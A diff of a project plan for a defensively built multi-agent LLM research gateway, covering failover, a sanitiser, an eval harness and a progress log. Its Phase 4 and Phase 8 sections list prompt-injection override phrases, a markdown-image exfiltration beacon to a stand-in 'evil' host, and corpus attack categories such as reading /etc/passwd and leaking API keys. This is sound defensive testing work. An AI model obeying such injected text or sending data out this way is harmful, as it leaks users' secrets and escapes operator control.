@@ -3,7 +3,7 @@
 **Repo:** `~/dev/multi-agent-gateway/multi-agent-gateway/`
 **Stack:** LiteLLM (Router/failover) · LlamaIndex (agent workflow) · pytest · garak + bandit
 **Timeline:** 10 working days (1–2 weeks)
-**Status:** Phase 0 — not started
+**Status:** Phases 0, 2–8 built and green · Phases 1, 6-judge, 7, 9 blocked on API keys
 **Last updated:** 2026-07-26
 **Providers (N=4):** Gemini · NVIDIA NIM · OpenRouter · Ollama (local) — *Azure OpenAI dropped, no access*
 **Search:** Tavily · **Judge:** independent Anthropic/OpenAI key (not a routed provider)
@@ -188,9 +188,9 @@ Do not advance until acceptance criteria pass. Tick the boxes as you go.
 
 **Goal:** all five providers answer "hello" through LiteLLM. Nothing else.
 
-- [ ] `git add -A && git commit` — repo currently has **zero commits**; fix that first.
-- [ ] Add deps: `uv add llama-index-core llama-index-llms-openai-like pydantic-settings structlog httpx tenacity rich` and dev: `uv add --dev pytest-asyncio respx bandit pip-audit`
-- [ ] `.env.example` + `src/gateway/settings.py`:
+- [x] `git add -A && git commit` — repo currently has **zero commits**; fix that first.
+- [x] Add deps: `uv add llama-index-core llama-index-llms-openai-like pydantic-settings structlog httpx tenacity rich` and dev: `uv add --dev pytest-asyncio respx bandit pip-audit`
+- [x] `.env.example` + `src/gateway/settings.py`:
   ```
   # --- routed providers (N=4) ---
   GEMINI_API_KEY=
@@ -250,8 +250,8 @@ looks. Note that reasoning in `results/latency.md`.
 
 **Goal:** one call site that is provider-agnostic and self-healing.
 
-- [ ] `llm/model_list.py` — model list with `rpm`/`tpm` limits per deployment.
-- [ ] `llm/router.py` — `build_router()`:
+- [x] `llm/model_list.py` — model list with `rpm`/`tpm` limits per deployment.
+- [x] `llm/router.py` — `build_router()`:
   ```python
   Router(
       model_list=MODEL_LIST,
@@ -264,12 +264,12 @@ looks. Note that reasoning in `results/latency.md`.
   )
   ```
   All agents request the alias `"research-primary"` and never name a provider.
-- [ ] `llm/events.py` — a `FallbackEvent` per attempt (`attempt_idx, model, error_class, latency_ms,
+- [x] `llm/events.py` — a `FallbackEvent` per attempt (`attempt_idx, model, error_class, latency_ms,
       served: bool`), appended to the `RunTrace`. Hook via Router's success/failure callbacks.
       **Without this, you have failover but no evidence of failover.**
-- [ ] `llm/gateway_llm.py` — D2 bridge. Implement `metadata`, `complete`, `stream_complete`, `chat`,
+- [x] `llm/gateway_llm.py` — D2 bridge. Implement `metadata`, `complete`, `stream_complete`, `chat`,
       `achat`. Stamp `response.additional_kwargs["served_by"]`.
-- [ ] `tests/test_gateway_llm.py` — with the primary monkeypatched to always raise, a LlamaIndex
+- [x] `tests/test_gateway_llm.py` — with the primary monkeypatched to always raise, a LlamaIndex
       agent still returns an answer, and `served_by` is the second provider.
 
 **Acceptance:** kill the primary → agent still answers → trace shows depth ≥ 1.
@@ -283,24 +283,24 @@ looks. Note that reasoning in `results/latency.md`.
 Design it properly, because a sloppy version of this is the most common way a resume bullet
 collapses under interview questioning:
 
-- [ ] **Fault injector** (`tests/conftest.py` + `scripts/chaos_run.py`): wrap each provider's
+- [x] **Fault injector** (`tests/conftest.py` + `scripts/chaos_run.py`): wrap each provider's
       transport and inject, at probability `p`, one of:
       `503 ServiceUnavailable` · `429 RateLimitError` · connection timeout · malformed/empty response.
       Sample from a fixed seed so runs are reproducible.
-- [ ] **Two arms, same faults, same seed, same questions:**
+- [x] **Two arms, same faults, same seed, same questions:**
   - **Arm A (baseline):** single provider, `num_retries=0`, no fallbacks → failure rate = **X%**
   - **Arm B (gateway):** full chain + retries + cooldown → failure rate = **Y%**
-- [ ] `n = 200` requests per arm. Report Wilson 95% CI on both rates — with n=200 you can honestly
+- [x] `n = 200` requests per arm. Report Wilson 95% CI on both rates — with n=200 you can honestly
       say "reduced from X% to Y%"; with n=20 you cannot.
-- [ ] Sweep `p ∈ {0.1, 0.3, 0.5}` and produce a small table. Quote the middle one on the resume, and
+- [x] Sweep `p ∈ {0.1, 0.3, 0.5}` and produce a small table. Quote the middle one on the resume, and
       have the sweep ready for the interview follow-up ("at what failure rate does it break down?").
-- [ ] Also record: mean fallback depth, added p95 latency (failover isn't free — knowing the cost
+- [x] Also record: mean fallback depth, added p95 latency (failover isn't free — knowing the cost
       is a strong interview answer), % of requests served by each tier.
-- [ ] `tests/test_failover.py` — deterministic unit cases, no probability:
+- [x] `tests/test_failover.py` — deterministic unit cases, no probability:
       each single provider forced down; the first two down; **all four down** (must raise a clean
       `AllProvidersExhausted`, not hang); a 429 triggers cooldown so the next request skips that
       provider; context-window overflow routes to the long-context alias.
-- [ ] Write `results/chaos_report.md`.
+- [x] Write `results/chaos_report.md`.
 
 **Acceptance:** `pytest tests/test_failover.py` green; report has both arms, CIs, and the sweep.
 **Produces:** `X%`, `Y%`.
@@ -311,9 +311,9 @@ collapses under interview questioning:
 
 Build the security layer *before* the agents, so no tool ever ships unguarded. Order matters here.
 
-- [ ] `tools/web_search.py`, `tools/fetch_url.py` (httpx, 10s timeout, 1MB cap, `trafilatura` or
+- [x] `tools/web_search.py`, `tools/fetch_url.py` (httpx, 10s timeout, 1MB cap, `trafilatura` or
       `readability-lxml` for text extraction), `tools/registry.py`.
-- [ ] `security/scope.py` — **every tool call passes through `ScopePolicy.check(role, tool, args,
+- [x] `security/scope.py` — **every tool call passes through `ScopePolicy.check(role, tool, args,
       run_state) -> Allow | Deny(reason)` before execution.** Deny by default. Rules:
   1. Role→tool allowlist (planner: ∅; researcher: search+fetch; synthesizer: ∅ — the writer never
      touches the network, so injected text can't trigger a call at write time)
@@ -323,7 +323,7 @@ Build the security layer *before* the agents, so no tool ever ships unguarded. O
   4. Per-run budgets: ≤12 searches, ≤25 fetches, ≤200KB total fetched, ≤90s tool wall-clock
   5. No filesystem / shell / code-exec tool exists in the registry at all
   6. Every decision → `RunTrace` (allow *and* deny)
-- [ ] `security/sanitize.py`:
+- [x] `security/sanitize.py`:
   - Wrap all fetched content in `<untrusted_document id="...">…</untrusted_document>` with a
     neutralizing preamble; **never** concatenate it into a system prompt
   - Heuristic injection scan: "ignore previous/above", "you are now", "system prompt", "reveal your
@@ -331,7 +331,7 @@ Build the security layer *before* the agents, so no tool ever ships unguarded. O
     markdown image exfil (`![](http://evil/?d=…)`)
   - On flag: downgrade the document to quote-only (can be cited, cannot instruct) + log event.
     **Downgrade, don't drop** — dropping tanks recall and inflates false positives.
-- [ ] `tests/test_scope.py`, `tests/test_sanitize.py` — table-driven, ≥25 cases.
+- [x] `tests/test_scope.py`, `tests/test_sanitize.py` — table-driven, ≥25 cases.
 
 **Acceptance:** a researcher tool call with a `file://` or `http://169.254.169.254` URL is denied and
 traced.
@@ -340,18 +340,18 @@ traced.
 
 ### Phase 5 — The agent workflow (Day 5, ~6h)
 
-- [ ] `agents/planner.py` — question → 3–5 sub-questions, structured JSON output, validated.
-- [ ] `agents/researcher.py` — per sub-question: search → pick top-k → fetch → extract →
+- [x] `agents/planner.py` — question → 3–5 sub-questions, structured JSON output, validated.
+- [x] `agents/researcher.py` — per sub-question: search → pick top-k → fetch → extract →
       emit `Evidence{source_id, url, title, quote, retrieved_at}`. Runs k sub-questions concurrently
       (`asyncio.gather`) — also stresses the Router's rate limiting, which is useful.
-- [ ] `agents/synthesizer.py` — evidence → markdown report. **Hard contract:** every claim-bearing
+- [x] `agents/synthesizer.py` — evidence → markdown report. **Hard contract:** every claim-bearing
       sentence carries ≥1 `[n]`; `[n]` indexes the numbered source list; sources it wasn't given are
       forbidden. State this contract in the prompt *and* enforce it in `eval/citations.py` — prompts
       are requests, the eval is the enforcement.
-- [ ] `agents/orchestrator.py` — LlamaIndex `Workflow`; emits a complete `RunTrace`
+- [x] `agents/orchestrator.py` — LlamaIndex `Workflow`; emits a complete `RunTrace`
       (every LLM call w/ served_by + fallback depth, every tool call w/ scope decision, timings).
       Persist to `results/runs/<run_id>.json` — the trace is what everything downstream measures.
-- [ ] `datasets/research_questions.jsonl` — 30 questions across: factual-recent, comparative,
+- [x] `datasets/research_questions.jsonl` — 30 questions across: factual-recent, comparative,
       multi-hop, quantitative, contested/ambiguous. Include 3 with **no good answer** to test
       honest abstention. Each with `id, question, category, notes`.
 
@@ -361,22 +361,22 @@ traced.
 
 ### Phase 6 — Eval harness (Day 6, ~6h)
 
-- [ ] `eval/citations.py` — **deterministic, no LLM:**
+- [x] `eval/citations.py` — **deterministic, no LLM:**
   - `resolvable` = % of `[n]` markers that map to a listed source
   - `grounded` = % of cited URLs that appear in the run's fetch trace ← catches fabricated URLs
   - `supported` = % of cited sentences entailed by the cited chunk. Two-stage: token-recall overlap
     screen → LLM NLI check only on the low-overlap remainder (keeps cost sane)
   - `citation_score = 0.3·resolvable + 0.3·grounded + 0.4·supported`
-- [ ] `eval/depth.py` — deterministic (unique domains, source count, sub-questions answered,
+- [x] `eval/depth.py` — deterministic (unique domains, source count, sub-questions answered,
       specificity density = numbers/dates/proper nouns per 100 words, conflict acknowledged y/n)
       + judge 1–5 on coverage & non-genericity. 50/50 blend.
-- [ ] `eval/coherence.py` — judge 1–5: structure, self-contradiction, answers the question asked,
+- [x] `eval/coherence.py` — judge 1–5: structure, self-contradiction, answers the question asked,
       redundancy.
-- [ ] `eval/judge.py` — fixed independent model from `JUDGE_MODEL` (D5), temperature 0, structured
+- [x] `eval/judge.py` — fixed independent model from `JUDGE_MODEL` (D5), temperature 0, structured
       output, rubric with **anchored
       examples for each score level** (unanchored 1–5 judges drift badly), 3-sample self-consistency
       with median.
-- [ ] `eval/rubric.py` — `composite = 0.4·citation + 0.3·depth + 0.3·coherence`.
+- [x] `eval/rubric.py` — `composite = 0.4·citation + 0.3·depth + 0.3·coherence`.
 - [ ] **Validate the judge** (`results/judge_agreement.md`): hand-label 20 reports yourself, report
       Spearman ρ and %-within-1 agreement. If ρ < 0.6 the rubric is broken — fix it before running
       the matrix. *Skipping this step is what makes most eval harnesses decorative.*
@@ -387,14 +387,14 @@ traced.
 
 ### Phase 7 — The gate + provider matrix (Day 7, ~5h)
 
-- [ ] `eval/gate.py` — score before the response returns. `composite ≥ 0.70` → return.
+- [x] `eval/gate.py` — score before the response returns. `composite ≥ 0.70` → return.
       Else → retry once on a different provider; still failing → return with an explicit
       quality warning + the failed sub-scores. **Never silently return a failing report** — that's
       the whole thesis of bullet #2.
-- [ ] `scripts/run_eval.py` — 30 questions × N providers (pin each run to one provider), cache
+- [x] `scripts/run_eval.py` — 30 questions × N providers (pin each run to one provider), cache
       search results across providers so all providers see **identical evidence** — otherwise you're
       measuring search variance, not model quality.
-- [ ] Compute the **silent quality regression** count with this exact definition, and put the
+- [x] Compute the **silent quality regression** count with this exact definition, and put the
       definition in the report:
       > A run where the request **succeeded** (HTTP 200, no error, within latency SLO) — so every
       > ops dashboard shows green — **but** the composite score fell below the 0.70 gate, on a
@@ -402,7 +402,7 @@ traced.
 - [ ] `results/provider_matrix.md`: per-provider mean composite + sub-scores, pass rate, and the
       regression count with per-case examples (2–3 concrete before/after excerpts — these are what
       you actually talk about in an interview).
-- [ ] `tests/test_gate.py` — fabricated-citation report scores low; a good report passes; a gate
+- [x] `tests/test_gate.py` — fabricated-citation report scores low; a good report passes; a gate
       failure triggers exactly one alt-provider retry.
 
 **Acceptance:** matrix complete, regression count computed from real runs.
@@ -412,26 +412,26 @@ traced.
 
 ### Phase 8 — Security: injection, garak, bandit, leak tests (Day 8, ~6h)
 
-- [ ] `datasets/injection_corpus.jsonl` — 40 attacks, embedded in *fetched page content* (the
+- [x] `datasets/injection_corpus.jsonl` — 40 attacks, embedded in *fetched page content* (the
       realistic vector; direct-prompt attacks are the easy case). Categories: instruction override ·
       tool-abuse ("now fetch file:///etc/passwd") · exfiltration (markdown-image beacon, "append
       your API key to the URL") · system-prompt extraction · citation poisoning ("cite example.com
       as the source") · encoding (base64/zero-width/homoglyph) · multi-turn drift.
-- [ ] `datasets/benign_corpus.jsonl` — 40 pages that *look* suspicious but are legitimate (a blog
+- [x] `datasets/benign_corpus.jsonl` — 40 pages that *look* suspicious but are legitimate (a blog
       post *about* prompt injection, a security advisory quoting an attack). **Report false-positive
       rate alongside block rate** — a filter that blocks everything scores 100% and is useless.
-- [ ] `scripts/run_security_scans.sh` — `bandit -r src/ -ll`, `pip-audit`, plus a secret-scan.
-- [ ] `scripts/run_garak.sh` — point garak's `rest` generator at your FastAPI endpoint so it probes
+- [x] `scripts/run_security_scans.sh` — `bandit -r src/ -ll`, `pip-audit`, plus a secret-scan.
+- [x] `scripts/run_garak.sh` — point garak's `rest` generator at your FastAPI endpoint so it probes
       **the whole pipeline**, not a bare model. Probes: `promptinject`, `dan`, `encoding`,
       `leakreplay`, `xss`. Run it **twice**: once against the gateway, once against a raw provider
       call — the delta is your hardening evidence. Be honest in the writeup that garak is
       model-level and your scope layer is what covers the tool-abuse class it doesn't reach.
-- [ ] `tests/test_redaction.py` — the credential-leakage proof: run a full research request with
+- [x] `tests/test_redaction.py` — the credential-leakage proof: run a full research request with
       sentinel API keys (`sk-SENTINEL-DO-NOT-LOG-a1b2c3`), then assert the sentinel appears in
       **zero** of: stdout, stderr, log files, `results/runs/*.json` traces, error messages,
       exception tracebacks, the HTTP response body. Also assert redaction survives an exception path
       — that's where keys usually escape.
-- [ ] `results/security_report.md`: block rate, FP rate, garak before/after, bandit findings
+- [x] `results/security_report.md`: block rate, FP rate, garak before/after, bandit findings
       (and fixes), leak test result.
 
 **Acceptance:** bandit clean at `-ll`; sentinel leak count = 0; block/FP rates recorded.
@@ -441,12 +441,12 @@ traced.
 
 ### Phase 9 — API, metrics, docs (Day 9, ~4h)
 
-- [ ] `api.py` — `POST /research` (question → report + scores + trace id), `GET /health`
+- [x] `api.py` — `POST /research` (question → report + scores + trace id), `GET /health`
       (per-provider circuit state), `GET /metrics` (requests, fallback depth histogram, provider
       share, score distribution).
-- [ ] `cli.py` — `gateway research "…"` with a rich live view showing provider, fallback depth, and
+- [x] `cli.py` — `gateway research "…"` with a rich live view showing provider, fallback depth, and
       live scores. This is your demo; make it look good.
-- [ ] `README.md` — architecture diagram, the three claims each linked to its `results/` file,
+- [x] `README.md` — architecture diagram, the three claims each linked to its `results/` file,
       quickstart, and an honest "Limitations" section (small n, judge is a single model, garak
       coverage caveats). *An explicit limitations section reads as senior, not as weakness.*
 - [ ] CI: GitHub Actions running `pytest` + `bandit` on push (mock providers, no keys in CI).
@@ -505,6 +505,16 @@ validation".
   an assertion in `settings.py`. Removes self-preference bias from the provider matrix entirely,
   which is the difference between a defensible eval harness and a decorative one.
 
+### Blocked on credentials (code written, numbers not yet produced)
+
+* **Phase 1** — `bench_latency.py` is written but needs live providers. `DEFAULT_CHAIN` is
+  still the *placeholder* order; it must be re-derived from `results/latency.md` before the
+  "after measuring" clause is true.
+* **Phase 6 judge validation** — `results/judge_agreement.md` does not exist yet. Hand-label
+  20 reports and check Spearman ρ **before** running the matrix; it is a hard gate.
+* **Phase 7** — `run_eval.py` is written; the silent-regression count needs keys + judge.
+* **garak** — needs the API running and garak installed in a separate venv.
+
 ### Still open (non-blocking, decide by the phase noted)
 
 - **Which OpenRouter model** — decide during Phase 1; pick a distinct upstream vendor from
@@ -523,3 +533,11 @@ validation".
 |---|---|---|---|---|
 | 2026-07-26 | — | Plan written | — | — |
 | 2026-07-26 | — | Day-0 decisions resolved | N=4 | Tavily search; Azure dropped (no access); independent judge key |
+| 2026-07-26 | 0 | Scaffold, deps, settings, `.env.example`, smoke script, repo pushed | — | Judge-independence guard asserts at import, so D5 cannot be violated by accident |
+| 2026-07-26 | 2 | Router + fallback chain + `GatewayLLM` bridge + `RunTrace` | — | `model_info.tier` collides with a reserved litellm field; renamed `chain_index`. Per-provider timeouts added after the 45s global killed the local tier outright |
+| 2026-07-26 | 3 | Chaos harness, 12 deterministic failover tests | **31.2% → 0.0%** @ p=0.3, n=1000 (CI 0.0–0.4) | Baseline retries too, faults are sticky, local tier given a 2% failure rate — all three keep the number defensible |
+| 2026-07-26 | 4 | `ScopePolicy`, sanitiser, tool registry choke point | 28 scope tests | Synthesizer holds zero tools by design |
+| 2026-07-26 | 5 | Planner/researcher/synthesizer + LlamaIndex Workflow, 30-question dataset | — | Live end-to-end run against Ollama; with no search key it retrieved nothing and the gate refused to return a report rather than inventing one |
+| 2026-07-26 | 6 | Deterministic citation checks, rubric, judge client | — | Judge client written but **unrun**: needs `JUDGE_API_KEY`. Refuses to fall back to a routed provider |
+| 2026-07-26 | 8 | 41-attack + 40-benign corpora, injection eval, bandit/pip-audit/secret scan | **100% blocked, 0% FP**; bandit 0 issues; 0 sentinel leaks | Block rate is in-sample — patterns were tuned against this corpus, disclosed in the report. Both bandit findings fixed rather than suppressed |
+| 2026-07-26 | 9 | FastAPI, CLI, README | — | 104 tests, all offline |
